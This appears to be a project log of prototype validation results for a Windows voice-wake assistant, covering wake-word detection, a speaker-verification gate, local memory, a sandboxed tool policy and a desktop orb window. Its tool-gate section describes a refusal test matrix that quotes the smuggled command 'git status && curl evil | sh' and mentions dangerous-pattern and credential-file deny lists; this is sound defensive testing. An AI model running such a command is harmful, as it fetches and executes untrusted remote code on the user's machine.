# Prototype Results

> Started: 2026-07-22

## Validation levels (legend)

Every claim below is tagged by how it was established. Do not promote a lower level to a higher one without new evidence.

- **DOC** — documented upstream claim or checked-in report from another repo; not re-run here.
- **AUTO** — automated test / script run in this workspace's `.venv` or `desktop`, deterministic, no external hardware.
- **SIM** — simulated/synthesized input (mock transport, synthesized audio, headless browser); exercises real code paths but not real devices.
- **REAL-MIC** — real microphone on this Windows host.
- **REAL-AGENT** — a real external agent process was launched, streamed real output, and completed a turn. Mock subprocesses are SIM.
- **REAL-EVOX** — real EvoX session over the live bridge.
- **REAL-WIN** — real Tauri/WebView2 window behavior (transparency, DPI, multi-monitor, RDP).

Current status: DOC/AUTO/SIM and one REAL-MIC wake are established. REAL-AGENT, REAL-EVOX and REAL-WIN acceptance are **not yet done** and remain release blockers.

## Environment of record (2026-07-28)

- OS: Windows 11 Pro (10.0.26200). Host `.venv` Python **3.12.10**.
- Python deps: `sherpa-onnx 1.13.4`, `sherpa-onnx-core 1.13.4`, `numpy 2.5.1`, `sounddevice 0.5.5`, `soundfile 0.14.0`, `pytest 9.1.1`.
- Frontend: Node **v24.11.1**, npm **11.7.0**, TypeScript 5.6.x, Vite 8.1.x, Tauri 2.x.
- Models present under `models/`: KWS `sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01`, `silero_vad.onnx`, MeloTTS `vits-melo-tts-zh_en`.

## Reproduction commands

| Purpose | Command | Level |
|---|---|---|
| Python suite | `.venv/Scripts/python.exe -m pytest tests -q` → 169 passed, 2 skipped | AUTO |
| Memory | `.venv/Scripts/python.exe -m pytest tests/test_memory.py -q` → 62 passed | AUTO |
| Speaker gate (model-free) | `.venv/Scripts/python.exe -m pytest tests/test_speaker.py tests/test_speaker_privacy.py -q` | AUTO |
| Speaker gate (real model) | `.venv/Scripts/python.exe -m pytest tests/integration/test_speaker_model.py -q` | AUTO |
| Event + registry contracts | `.venv/Scripts/python.exe -m pytest tests/test_agent_event_schema.py -q` → 34 passed | AUTO |
| Voiceprint enrollment | `.venv/Scripts/python.exe scripts/enroll_speaker.py --name <名字>` | REAL-MIC |
| Voice smoke | `.venv/Scripts/python.exe scripts/smoke_voice.py` | SIM |
| Simulated E2E | `.venv/Scripts/python.exe scripts/e2e_simulated.py` | SIM |
| t10 stack validation | `.venv/Scripts/python.exe scripts/acceptance/t10_voice_stack_validation.py` | AUTO+SIM |
| TTS→VAD→KWS loop | `.venv/Scripts/python.exe tmp_proto/tts_kws_vad.py` | SIM |
| Live mic wake | `.venv/Scripts/python.exe scripts/acceptance/live_wake.py` | REAL-MIC |
| Orb render spike | serve `tmp_proto/orb_spike.html`, drive `window.__SPIKE__` | SIM |

## Completed

- Target workspace initially contained only the plan asset.
- Adjacent VoxCord contains the planned core, desktop shell, local wake providers, references, tests, and Windows packaging documentation.
- Its checked-in health report records 124 core tests, 14/14 desktop E2E tests, successful TypeScript checks, Windows Tauri bundle generation, local KWS readiness, and zero cloud calls for local wake tests.

## Session 2026-07-22 (plugin tools + simulated E2E)

Verified in this workspace, this session:

- `python -m pytest tests -q` → 15 passed (contract, state machine, provider adapter, session bridge, plugin tools).
- `python scripts/smoke_voice.py` → OK.
- `python scripts/e2e_simulated.py` → OK (mock transport; wake → ASR → bridge send → reply → TTS events → continuous listening → cancel → stop).
- `desktop`: `npm run build` (tsc + vite) → OK; `cargo check` on `desktop/src-tauri` → OK, zero warnings.

Implemented this session:

- Plugin tool surface: `pause`, `resume`, `wake_test` (synthetic marker), `complete_turn` (llm.delta/tts.chunk/turn.done with speaking → listening continuous-conversation transition), `devices` (optional sounddevice backend), `diagnose` (provider/bridge readiness, no credential leakage), optional `ConversationTransport` wiring in `submit_text`/`cancel`.
- Fixed an unused-import warning in `desktop/src-tauri/src/main.rs`.

Verification levels: all of the above are automated/simulated. No real microphone, no real EvoX session, no live wake model was exercised.

## Carried forward from the prior session

- Real microphone wake run in the current Windows environment.
- Live EvoX conversation bridge.
- Real streaming first-token latency.
- Separate always-on-top, skip-taskbar wake window (defined and compiling, not visually accepted).
- Fresh isolated installs of candidates other than sherpa-onnx.

## Session 2026-07-23 (isolated Sherpa provider + routines)

Verified in this workspace:

- Added `SherpaKeywordProvider` and optional `SounddeviceWakeCapture` in `core/providers.py`. Runtime imports are lazy; missing model, Sherpa, or sounddevice produces a diagnostic/unavailable result rather than breaking the plugin import path.
- Added `tests/test_sherpa_provider.py`, plugin capture lifecycle tests, and hardened bridge tests; full Python suite is now **21 passed**.
- Sherpa-ONNX `1.13.4` loads the downloaded Chinese KWS model from `models/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01`.
- Streaming 100 ms chunks ran at **RTF 0.016** on the bundled test wav; the 3-second silence control produced no hit and native inference state released cleanly.
- `python scripts/smoke_voice.py` passed.
- `python scripts/e2e_simulated.py` passed; this remains simulated and does not use a microphone or live EvoX session.
- `desktop`: `npm run build` passed.
- `desktop/src-tauri`: `cargo check` passed after `cargo clean` removed stale build artifacts containing the old path `D:\program\vioce-wake\语音唤醒对话`.
- Added [docs/routines.md](../routines.md) with repeatable commands and the appropriate trigger for each routine.
- Installed `sounddevice 0.5.5` in `.venv`; enumerated Realtek, ToDesk virtual, DirectSound, WASAPI, and WDM-KS inputs.
- Copied the MIT Silero ONNX model from the adjacent checked-out upstream package data for isolated prototyping; SHA-256 is `1a153a22f4509e292a94e67d6f9b85e8deb25b4988682b7e174c65279d8788e3`.
- Sherpa Silero VAD detected a speech segment in the bundled 8.03-second KWS wav and rejected generated silence.
- A 3-second local Realtek microphone capture completed in 3.142 seconds (`RMS 0.000044`, peak `0.001068`), produced no VAD segment in the quiet environment, saved/uploaded no audio, and released the device.
- `SounddeviceWakeCapture` and the plugin `start → pause → resume → stop` lifecycle opened and released the real microphone successfully without a wake hit in the quiet sample.
- Hardened `LocalEvoXTransport`: parsed loopback validation rejects lookalike hosts such as `localhost.evil.example`, rejects URL credentials, URL-encodes cancellation IDs, and rejects turn responses without `turn_id`.

The bundled KWS test wav produced detections for the model's test keyword file. It was not a recording of `你好问问`, so this is a runtime/pipeline verification, not yet a Chinese wake-word quality acceptance test.

## TTS download status — RESOLVED

The archive was resumed to a complete **160 MiB** file on 2026-07-23. `bzip2 -tv` passed, and it was extracted to `models/vits-melo-tts-zh_en`.

## Session 2026-07-23 (TTS → VAD → KWS closed loop)

- Silero VAD model copied from the adjacent silero-vad reference (MIT): `models/silero_vad.onnx`, SHA-256 `1a153a22f4509e292a94e67d6f9b85e8deb25b4988682b7e174c65279d8788e3`.
- Added `SherpaVadProvider` in `core/providers.py` (Silero VAD via sherpa-onnx `VoiceActivityDetector`).
- Added `tmp_proto/tts_kws_vad.py`: synthesizes `你好问问` with the MeloTTS VITS model, resamples 44.1 kHz → 16 kHz, runs VAD, then KWS.
- Verified: TTS generation 0.72 s audio (RTF ~0.3–0.49), VAD detected one 11,328-sample speech segment, **KWS hit `你好问问`** from the synthesized audio.
- SHA-256 recorded for `tts.tar.bz2` (`e58351ed…1514`) and `model.onnx` (`bf30582e…ad86d`).
- Console mojibake (`你好问问` shown as `����`) is a Windows codepage display issue only; UTF-8 bytes are correct.
- Audio capture lifecycle wired into `VoicePlugin`: `start/resume` start the capture, `pause/stop` release it, capture start failure rolls back `running` state; `diagnose()` now reports `capture_attached`.
- Python suite: **21 passed**.

## Session 2026-07-26 (real microphone wake — VERIFIED)

- Added `scripts/acceptance/live_wake.py`: `SounddeviceWakeCapture` + `SherpaKeywordProvider` over the Realtek mic array (device 1), 16 kHz, threshold 0.25, audio in memory only.
- Live run: spoken `你好问问` produced a wake hit at **7.193 s** with score 1.0; capture stopped and resources released; nothing saved to disk.

## Session 2026-07-28 (t10 consolidated voice-stack validation + suite hygiene)

Environment: this workspace's isolated `.venv`, Windows, Python 3.12.10, sherpa-onnx 1.13.4, numpy 2.5.1, sounddevice 0.5.5, soundfile 0.14.0.

Suite hygiene:

- Installed `pytest 9.1.1` into `.venv` (previously missing, which blocked the documented `python -m pytest tests -q`).
- Gated the two `VoxCordAdapter` tests in `tests/test_provider_adapter.py` with `pytest.mark.skipif` when the adjacent VoxCord checkout is absent (it is not present on this host). They now **skip** instead of failing.
- `python -m pytest tests -q` → **19 passed, 2 skipped** (VoxCord optional).
- `python scripts/smoke_voice.py` → OK. `python scripts/e2e_simulated.py` → OK (17 events, 2 bridge sends, 1 cancel; mock transport).

t10 harness (`scripts/acceptance/t10_voice_stack_validation.py`) — release-path core sherpa-onnx, all checks passed:

| Check | Result | Evidence level |
|---|---|---|
| Windows startup + model load | KWS 0.627 s, VAD 0.053 s, both available | real local model load |
| Local Chinese wake on synth `你好问问` | hit; TTS gen 0.235 s; decode 0.026 s (RTF ~0.002) | synthesized audio, not a live mic recording |
| Resource release (8× open/close cycles) | python peak growth 0.01 MB, no leak | automated |
| Continuous run (12 s / 120 chunks silence) | 0 spurious hits, RTF 0.0186 | automated |
| Swappable conversation backend | two distinct transports drive identical turn path | automated (mock transports) |
| Interruptible TTS / barge-in | cancel during `speaking` → `turn.cancelled`, transport told to cancel pending turn, clean return to idle | automated (mock transport) |

Verification level: automated + synthesized audio. This is **not** a live-microphone or live-EvoX acceptance; those remain in the "Not yet verified" list below. The swappable-backend and barge-in checks use mock transports, confirming the plugin/turn orchestration is backend-agnostic and interruptible at the contract level.

## Session 2026-07-28 (t11 orb render-route spike)

Isolated UI prototype `tmp_proto/orb_spike.html` served over `python -m http.server 8791` and driven headlessly (Chromium via CDP, DPR 1). It carries all three candidate render routes behind a `window.__SPIKE__` API with `measure(route, ms)`, `setAmplitude`, and `glSupported()` hooks.

| Route | FPS (2 s window) | Render | Verdict |
|---|---:|---|---|
| CSS-only (degradation baseline) | 239.8 | conic-gradient core + blur, no raster canvas | **direct adopt** as degraded/static tier |
| Canvas 2D + rings (v1 main path) | 239.9 | radial glow + 3 amplitude-driven wave rings, clean, deterministic | **direct adopt** as v1 primary |
| WebGL shader (v2 option) | 240.0 | fragment-shader glow + concentric ring interference, richer | **v2 upgrade path**, GPU/driver dependent |

Additional evidence captured this run:

- WebGL: `glSupported() === true`, no compile/link error on this host; screenshot shows shader ring interference distinct from the Canvas route.
- Amplitude clamp verified: input `[0, 0.5, 1, 0.5, 0]` → clamped `[0.12, 0.5, 1, 0.5, 0.12]` (floor 0.12, ceil 1.0).
- Degradation signals all queryable: `matchMedia('(prefers-reduced-motion: reduce)')`, `navigator.hardwareConcurrency` (32), Canvas 2D context, WebGL context, `devicePixelRatio` — this is the full input set the quality-tier selector (t31) needs.
- Zero console errors across all three routes; screenshots captured for CSS, Canvas 2D, and WebGL.

Verification level: automated + headless Chromium visual capture. **Not** verified here: transparent-window compositing inside the real WebView2 runtime, true Windows DPI scaling at 125%/150%/175%, GPU load under sustained animation, and remote-desktop (RDP) software-render fallback. Those require the actual Tauri window and remain Phase 6 / t53 acceptance items. The spike confirms the plan's chosen architecture (Canvas 2D primary + CSS degradation + WebGL as v2) is technically sound at the render-route level before committing the production renderer files (t28–t35).

## Session 2026-08-02 (P1 speaker gate — measured on real speech)

Model: `models/3dspeaker_speech_eres2net_base_sv_zh-cn_3dspeaker_16k.onnx`, 39,593,761 bytes, SHA-256 `1a331345f04805badbb495c775a6ddffcdd1a732567d5ec8b3d5749e3c7a5e4b`, embedding **dim 512**. Loaded through the already-installed sherpa-onnx 1.13.4 — **zero new Python dependency**, confirmed by return value (`load()` → `available=True`), not by absence of an exception.

### Cosine separation on the 7 bundled KWS wavs — AUTO

The recordings in `models/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01/test_wavs/` are real human speech (3.55–8.03 s each). No speaker labels ship with them; the grouping below was **derived from** the score matrix, then used to state the separation:

| Pair | Score | Pair | Score |
|---|---:|---|---:|
| 0–1 | 0.777 | 0–3 | −0.074 |
| 0–2 | 0.813 | 0–4 | 0.027 |
| 1–2 | **0.866** | 1–5 | −0.105 |
| 3–4 | **0.736** | 2–6 | −0.039 |
| 5–6 | 0.755 | 3–5 | 0.270 |
| | | 4–6 | 0.346 |
| | | 4–5 | **0.370** |

Three clusters: {0,1,2}, {3,4}, {5,6}. Within-cluster minimum **0.736**; cross-cluster maximum **0.370**. The shipped default `threshold = 0.5` sits inside that gap with ≈0.24 margin below and ≈0.13 above. Enrolling wav 0 then admits 1 and 2 and refuses 3, 4, 5, 6 — asserted in `tests/integration/test_speaker_model.py`.

**Evidence level is AUTO, not REAL-MIC.** The audio is real speech but recorded and pre-existing. What this establishes: the model discriminates, and 0.5 is a defensible default. What it does **not** establish: own-voice pass rate on this host's microphone, another person's rejection rate, or replay behaviour. All three still need P10 (release blocker #8).

### Negative result: synthetic audio cannot test discrimination — AUTO

Enrolled a 120 Hz harmonic stack (7 partials + noise), verified a 240 Hz one — an octave apart, about as different as two synthetic signals get. Result: **accepted, score 0.767**. The model is trained on speech and reads both as the same non-voice. Any discrimination test built on generated tones would pass vacuously; `test_synthetic_tones_cannot_stand_in_for_speech` pins this so the trap stays documented rather than rediscovered.

### KWS exposes no confidence — finding, corrects FR-1.8

`sherpa_onnx.lib._sherpa_onnx.KeywordResult` carries only `keyword`, `timestamps`, `tokens`, and `KeywordSpotter.get_result()` returns a bare `str`. There is **no per-hit confidence in this binding at all**. The previous code reported `1.0`, which read like a measurement and was not one — including in the 2026-07-26 REAL-MIC entry above, where "score 1.0" was that constant, not a detector output. `feed()` now returns `(keyword, None)`, and the number that reaches `wake.detected` is the speaker cosine similarity, which *is* measured. See ADR 002.

### Implemented and verified this session

- `core/audio/ring.py` — 3 s in-memory ring buffer (~192 KB @16 kHz float32). Red line 1's literal enforcement point: an AST test asserts the module imports nothing beyond `numpy`/`typing` and references no filesystem, socket, or subprocess name.
- `core/audio/capture.py` — gate wired at the KWS hit (ADR 002 option A). Preconditions checked **before** the device opens; every fail-closed branch raises.
- `core/audio/speaker.py` — `load_speaker_config()` + `from_config()` over `config/speaker.toml` via stdlib `tomllib`. Paths deliberately stay on environment variables so a checked-in config can never point at somebody's enrollment data.
- `vox_plugin/plugin.py` — `wake_rejected()` (no state transition, no reply) and `_diagnose_speaker()` (names and counts only, never a vector; explicit `warnings` when the gate is off).
- `scripts/enroll_speaker.py` — interactive Chinese-prompted enrollment, append-only, audio never written anywhere.
- Suite: **67 passed, 2 skipped** (was 43 at the end of P0; 19 privacy/fail-closed tests plus 5 model-gated integration tests added).

Fail-closed paths asserted individually: model missing → `start()` raises; nobody enrolled → raises; no verifier attached but verification required → raises; verifier throws mid-decision → rejection, not a pass; score below threshold → silent rejection with no state change. A full gate cycle inside a `tmp_path` CWD leaves the directory **empty**.

## Session 2026-08-02 (P2 platform event contract — AUTO)

Two contracts, one envelope. Measured on the committed files:

| Fact | Measured value |
|---|---|
| `contracts/voice-events.schema.json` | 575 bytes, SHA-256 `4f60b6124dcb9704624a0606f411981d0bf572de22fcf4a25fad133bd3c75de5`, 9 types, version `"1"` |
| `contracts/agent-events.schema.json` | 880 bytes, 12 types (`task.*` 4 / `agent.*` 2 / `tool.*` 4 / `memory.*` 2) |
| `contracts/agents.schema.json` | 1,294 bytes, registry shape for `config/agents.toml` |
| `core/events.py` | 138 lines (was 93): `+ AGENT_SCHEMA_PATH`, `CONTRACT_PATHS`, `contract_for()`, `validate_any_event()` |
| `core/agents/schema.py` | 146 lines, hand-rolled subset validator |
| `tests/test_agent_event_schema.py` | 274 lines, **34 passed** |
| Suite | **101 passed, 2 skipped** in 13.04 s, 103 collected (was 67 at the end of P1) |
| New runtime dependency | **none** — `import jsonschema` in the `.venv` raises `ImportError`, checked, so both validators stay hand-rolled |

Three properties are now enforced rather than intended:

- **NFR-5.8 is a digest, not an intention.** `test_voice_contract_is_byte_identical` fails on any in-place edit of the voice contract and its assertion message says where platform events belong instead.
- **The two envelopes are interchangeable.** Same `required` set, same property set, same `version` const, both `additionalProperties: false` — and the two `type` enums are **disjoint**, which is what keeps `contract_for()` from being ambiguous. Both are asserted; a type declared by two contracts raises rather than silently first-matching.
- **The registry schema cannot over-declare.** `test_the_schema_stays_inside_the_validator_subset` walks every key in `agents.schema.json` and fails on any keyword the validator does not implement, because a declared-but-inert constraint reads as protection. `kind`'s enum is asserted equal to `AGENT_KINDS` for the same reason: a config that validates and then fails at adapter construction is the worst of the two failure modes.

Not established by this session: any platform event has an actual producer. All 12 types are declared and validated; `memory.*` gets one in P3, `tool.*` in P4, `task.*`/`agent.*` in P6. `config/agents.toml` does not exist yet either — only its shape does.

## Session 2026-08-02 (P3 memory — AUTO)

The measurement that decided the design, taken **before** any of it was written, in this `.venv`:

| Fact | Measured value |
|---|---|
| SQLite version / FTS5 | **3.49.1**, `ENABLE_FTS5` present in `PRAGMA compile_options` |
| `MATCH 'english'` against a row holding 「用户喜欢用中文交流 and english too」 | **1 hit** |
| `MATCH '中文'` against the same row | **0 hits** — `unicode61` treats the whole CJK run as one token |
| ICU tokenizer available | **no** (would be a new native dependency) |

So the FTS table indexes a derived token column instead of the text: index side = every CJK character plus every overlapping bigram, query side = bigrams only. Dropping single characters from the query side is what stops 「偏好」 matching a record that merely contains 「好」. Recall is two-stage — strict AND, then a bm25-ranked OR fallback only when strict comes back empty.

| Fact | Measured value |
|---|---|
| `core/memory/store.py` | 501 lines — schema, FTS5, tokenizers, config loading |
| `core/memory/write.py` | 359 lines — credential filter, dedup, Markdown mirror |
| `core/memory/recall.py` | 144 lines — match expression, two-stage recall, `MemoryRecaller` |
| `core/memory/__init__.py` | 89 lines — `open_memory()` returns the three collaborators as a tuple |
| `config/memory.toml` | 23 lines — `db_path`, `facts_dir`, `recall_limit = 8`, `short_keep = 200` |
| `records` column types | `TEXT` / `INTEGER` only — **no BLOB**, so audio has no column to land in |
| Credential samples refused whole | **9/9**, `store.count() == 0`, no event emitted, no copy in `last_refusal` |
| Ordinary sentences falsely refused | **0/5** (including 「我的密码忘了怎么办」 and 「token 是什么意思」) |
| Database footprint | one file plus SQLite's own `-wal` / `-shm` / `-journal` |
| `tests/test_memory.py` | 579 lines, **62 passed** in 0.69 s |
| `tests/test_plugin_tools.py` | 214 lines, **16 passed** (10 before, 6 for the memory wiring) |
| Suite | **169 passed, 2 skipped** in 13.78 s, 171 collected (was 101 at the end of P2) |
| New runtime dependency | **none** — `sqlite3` ships with CPython |

Four choices are worth recording because the obvious alternative was wrong:

- **De-duplication is a schema constraint, not writer discipline.** A partial unique index on `(scope, kind, fingerprint) WHERE scope = 'mid'` means only facts collapse. Turns and audit rows are a time series: two identical utterances are two events, and the long layer exists precisely to keep that history.
- **Credential-shaped text is refused whole, never redacted.** A multi-line private key is the deciding case — a pattern matches the header, and redaction would store the body.
- **Memory events carry no text.** An event fans out to every log and transport; ids, counts, scope and tags are enough for `diagnose()` to answer "did that get remembered" without the payload becoming a second copy of the store.
- **The gitignore pattern is anchored.** Measured, not reasoned about: `git check-ignore -v core/memory/store.py` reported `.gitignore:20:memory/`, and `git status --short` did not list the three new implementation files at all. A gitignore pattern without a leading slash matches at *any* depth, so the line meant to keep the user's personal store out of the repository was also hiding the store's source code — `__init__.py` and `contract.py` were visible only because they were already tracked. `/memory/` fixes it; a test parses `.gitignore` and asserts both directions so it cannot come back.

Not established by this session: cross-process persistence. Every Markdown round trip measured above happens inside one process. "Close the program, open it again, the fact is still there" is release blocker 11, level REAL. `prune_turns()` also has no caller yet, so the short layer does not self-trim, and `MemoryRecaller`'s output has no consumer until the dispatcher lands in P6.

## Session 2026-08-02 (P4 local tools + policy gate — AUTO)

The gate was written before any tool that needs it, and the refusal matrix was written as a separate file from the behaviour tests. That split paid for itself immediately — see the defect below.

| Fact | Measured value |
|---|---|
| `core/tools/policy.py` | 345 lines — config loader, sandbox resolution, 13 dangerous patterns, env scrub, `DefaultToolPolicy` |
| `core/tools/runner.py` | 171 lines — the single funnel: gate → tool → `tool.*` events → audit row |
| `core/tools/web.py` / `shell.py` / `fs.py` / `contract.py` / `__init__.py` | 120 / 115 / 76 / 80 / 85 lines (992 total for the package) |
| `config/tools.toml` | 53 lines, `[shell] enabled = false` as shipped |
| `vox_plugin/plugin.py` | 413 lines (was 326): `attach_tools()`, `run_tool()`, `diagnose()["tools"]` |
| `tests/test_tools.py` | 460 lines, **35 passed** |
| `tests/test_tool_security.py` | 555 lines, **89 collected — 88 passed, 1 skipped** |
| Both tool files together | **123 passed, 1 skipped in 0.48 s** |
| `tests/test_plugin_tools.py` | 331 lines, **24 passed** (16 before, 8 for the tool wiring) |
| Suite | **300 passed, 3 skipped** in 14.31 s, 303 collected (was 169 at the end of P3) |
| New runtime dependency | **none** — `shlex`, `subprocess`, `tomllib`, `urllib.parse` all ship with CPython |

### Latency of the fast path — AUTO

| Path | Median | Note |
|---|---:|---|
| `fs.read` of a 4 KB file, end to end | **0.64 ms** | gate + read + two events + audit row, 200 iterations |
| A refused request | **0.34 ms** | sandbox escape, refused before touching the filesystem |

NFR-1.10 targets < 50 ms for the rule-hit local-tool path. The tool half has two orders of magnitude of headroom; the rule-classification segment in front of it does not exist yet (P6), so the **whole** path remains unmeasured.

### A real defect, found by a test — `confirmed` was truthy, not identical

`_check_shell_run` originally read `not request.arguments.get("confirmed", False)`. A JSON body of `{"command": "git status", "confirmed": "no"}` therefore **executed the command**: `"no"` is a truthy string. Fixed in both places that check it (`policy.py` and `shell.py`) with `is not True`, and the four values `0` / `""` / `None` / `"no"` are now asserted to still require confirmation.

This is the argument for writing the refusal matrix as its own file: every positive test still passed with the hole open. A confirmation flag a stray string can set is not a confirmation flag.

### What the 89 refusal cases actually cover

Unknown tool / unknown origin / disabled section; four traversal shapes plus an absolute path plus a symlink; six credential filenames; two `denied_dirs` (`enrollment/`, `memory/`); the shipped deny list asserted in both directions; `shell.run` off by default; an off-allowlist command refused **with `needs_confirmation is False`**; token-prefix rather than string-prefix matching (`git status` must not admit `git statuses`); no verified speaker; agent origin blocked structurally; **all 13 dangerous patterns, each named**, plus a coverage test asserting the sample table's keys equal `DANGEROUS_PATTERNS`' names so a 14th pattern cannot be added untested; eight smuggling attempts behind an allowlisted prefix (`;` `&&` `|` backtick `$()` `>` `>>` newline); an unbalanced quote; `dangerous_patterns` rejected as a config key; env scrubbing; events carrying no content; the gate's warnings.

The check order is deliberate and asserted: command present → dangerous shape → allowlist → verified speaker → confirmation. Shape before allowlist is why `git status && curl evil | sh` dies before it can be mistaken for a permitted prefix, and it is also why a blocked command never reaches the orb as a *pending* action.

### Four limits, recorded rather than smoothed over

- **The symlink-escape case skips on this account** — `Path.symlink_to` raises without the privilege, which is the Windows default. `resolve_in_sandbox` resolving before comparing is asserted directly as a unit property, but the end-to-end escape is unproven on this host.
- **`web.search` has never talked to a real backend.** Every case injects a fake. Normalisation (title / URL / snippet, blocklist, result cap) is proven; integration with a real provider is not, and cannot be until one is chosen — and choosing one means a cloud key, which red line 1 forbids by default.
- **`shell.run` has only ever executed `git --version`.** Timeout, output cap, and cwd behaviour are exercised on that one command. The confirmation *flow* — orb display, user action, resubmission — is not implemented at all; it is P8 and REAL-WIN.
- **The audit trail depends on the memory layer being attached.** With no writer, decisions are still counted and emitted as events but nothing persists. `describe()["audit_attached"]` is how the user tells the two apart.

Not established by this session: anything calls a tool automatically. `VoicePlugin.run_tool()` is the only entry point and it is opt-in; rule-based intent classification ("读一下 X" → execute directly) is P6. The plugin also supplies no verified speaker of its own, so `shell.run` through the plugin is always refused — correct until the dispatcher threads the name through.

## Session 2026-08-11 (P8 wake orb shell — AUTO + SIM)

Frontend `npm run build` (tsc + vite) clean; `cargo check --all-targets` clean with **zero warnings**; `cargo test` **8 passed** on the hit-region geometry.

**Selective click-through is polled, not hit-tested by the OS.** Tauri 2's `set_ignore_cursor_events` is an all-or-nothing window flag — there is no Electron `forward: true` equivalent, and once it is set the webview stops receiving `mouseenter`/`mouseleave` at all, so the webview cannot detect its own hover (tauri#6164, 社区来源 — GitHub WebFetch is blocked on this host, so this may not be cited as 官方确认). A 30 ms Rust-side cursor poll compares the cursor against a region **the frontend measures and reports**, and toggles the flag only on transitions.

**Geometry is owned by the frontend on purpose.** The circle's centre and radius are outputs of CSS layout; anything hardcoded in Rust drifts the moment a style changes, and the symptom of drift — "the orb won't click" or "clicks land on empty space" — is expensive to diagnose. `measureHitRegion()` walks `offsetLeft`/`offsetTop` (the **layout** box, not `getBoundingClientRect()`, which would include the per-frame float/breathe `transform` and re-fire IPC every frame) and reports logical CSS pixels; Rust converts the physical cursor into the same space via `(cursor - inner_position) / scale_factor`.

SIM (12/12) — the reported region translated into logical coordinates, fed through the same predicate as `main.rs`:

| case | expect |
|---|---|
| 折叠 orb centre / edge-inside (169.9) | hit |
| 折叠 edge-outside (171) / above / left / bottom-right blank | pass through |
| 展开 orb centre / panel interior / panel bottom-right corner | hit |
| 展开 gap between circle and panel / left of panel / below panel | pass through |

The gap cases are the point of the whole design: a naive bounding box would leave an invisible ~200 px square eating desktop clicks around a 148 px circle.

**Failure paths deliberately fail *open* (window eats the mouse).** If the cursor read, window position, or scale factor fails, or no region has been reported yet, the region is treated as "inside". The reverse looks politer but turns the tool-confirmation card into an un-clickable picture, and a confirmation nobody can click is equivalent to no confirmation. A ~200 px square blocking the desktop is recoverable; a dead Allow button is not.

Also closed this session: `.shadow(false)` (a transparent undecorated Windows window otherwise draws a rectangular grey halo that tracks the orb), window size following the reported content box clamped into `monitor.work_area()`, drag via an own `vox_start_drag` command behind a 4 px threshold (with the OS-synthesised trailing `click` swallowed only when `event.detail > 0`, so keyboard activation still fires), and runtime show/hide via `vox_set_visible` — which settles any pending confirmation as **denied** and collapses the panel before hiding.

**No capabilities file, deliberately.** Tauri 2 checks the ACL only for `plugin:`-prefixed commands or when the app ships its own ACL manifest (`tauri-2.10.3` `webview/mod.rs:1802`; the generated `acl-manifests.json` has no `app` key). Shipping none is the tightest posture available: every `core:*` plugin command is unreachable from the webview and the entire IPC surface is the three `vox_*` commands. The cost is that the frontend must never `import` `@tauri-apps/api` — it calls `__TAURI_INTERNALS__.invoke` directly and degrades silently to a no-op in a browser, which is what makes the SIM tests above runnable at all.

CSP widened to `default-src 'self'; style-src 'self' 'unsafe-inline'; connect-src ipc: http://ipc.localhost`. Without it IPC still works — `ipc-protocol.js` falls back from `fetch` to `window.ipc.postMessage` — but logs a warning on the first invoke.

**Nothing here is REAL-WIN.** `cargo check` is AUTO and the click-through table is SIM. Whether the click-through actually feels right, whether the shadow is really gone, whether drag tracks the cursor, and whether the DPI conversion holds at 125% / 150% / 175% all need the window on screen (发布阻塞项 #5).

## Session 2026-08-16 (subprocess encoding — AUTO, and a REAL-AGENT attempt that failed)

### A real defect, found by re-running the claimed baseline in a clean shell

`docs/handoff.md` and `.claude/CLAUDE.md` both recorded `599 passed, 2 skipped`. In a shell with no `PYTHON*` variables set the actual result was **`1 failed, 597 passed, 3 skipped`**. The failure:

```
tests/test_agent_acp.py::test_a_chinese_prompt_crosses_the_process_boundary_intact
assert 'hello 讲个笑话' == 'hello ����Ц��'
```

Left side (what came back from the child) was correct; the right side is the *expected* literal rendered through the console code page. The test file's bytes on disk are clean UTF-8 — verified byte-by-byte, both literals are `\xe8\xae\xb2\xe4\xb8\xaa\xe7\xac\x91\xe8\xaf\x9d`. So this was **not** the known "console mojibake is a display artifact" case: two Python `str` objects genuinely differed.

Root cause, measured rather than reasoned: a child `python -c` reports `sys.stdin.encoding sys.stdout.encoding` as **`gbk gbk`**. `Popen(encoding="utf-8")` binds only the *parent's* codecs. The child encodes its stdout with the ANSI code page (cp936 on this host), the parent decodes as UTF-8, and because the read side passes `errors="replace"` the result is U+FFFD sitting inside an otherwise valid reply — **silently wrong, never an error**. Setting either `PYTHONUTF8=1` or `PYTHONIOENCODING=utf-8` made the same file pass 10/10, which is what proves the mechanism *and* what made the old baseline unreproducible: it was recorded in a shell that happened to have one of them set.

### Scope, measured per spawn site

| Site | Prompt in | Reply out | Affected? |
|---|---|---|---|
| `cli.py` | argv (Windows argv is UTF-16, never the code page) | child's stdout codec | **only the reply**, and only for children that use the ANSI page |
| `acp.py` | stdin, parent writes UTF-8 | child's stdout codec | **both directions** for a Python child |
| `shell.py` | argv | child's stdout codec | reply only (`enabled=false` + empty allow-list today) |
| `desktop_bridge.py` | stdin | Rust child, writes UTF-8 | no |

`claude` is **not** affected: its stdout bytes for a non-ASCII reply are `\xc2\xb7` (UTF-8 `·`), i.e. Node writes UTF-8 on a cp936 Windows regardless. Decoded as gbk the same bytes give `路`. So the configured default agent's Chinese replies were never at risk; Python-based children and native Windows console tools are.

### The fix, and the half of it that is not fixable

`acp.py` now forces `PYTHONUTF8=1` + `PYTHONIOENCODING=utf-8` on the child (`_UTF8_ENV`), placed *before* `env_passthrough` so a variable the user named on purpose still wins. The justification is protocol-level, not cosmetic: **ACP frames are UTF-8 by specification**, so a peer emitting cp936 JSON is non-conforming and the adapter is entitled to say so.

`cli.py` deliberately keeps the opposite stance, which was already written into its test docstring — a bare CLI's stdout has no declared encoding, so its Chinese test asserts *length* (`"4"`), not text. Two sibling adapters taking opposite positions looked like an inconsistency and is actually the correct distinction; both docstrings now say why, so the next reader does not "unify" them.

**Not fixable from this side:** a non-Python child that writes the local code page. No environment variable can instruct an arbitrary program to change its stdout codec. Recorded in `handoff.md` §5 rather than smoothed over.

Result: **600 passed, 3 skipped**, identical in a clean shell and under `PYTHONUTF8=1`. Verified the two new tests actually bite by deleting `env.update(_UTF8_ENV)` and confirming both go red (2 failed, 10 passed) before restoring it.

### REAL-AGENT attempted and blocked — evidence not obtained

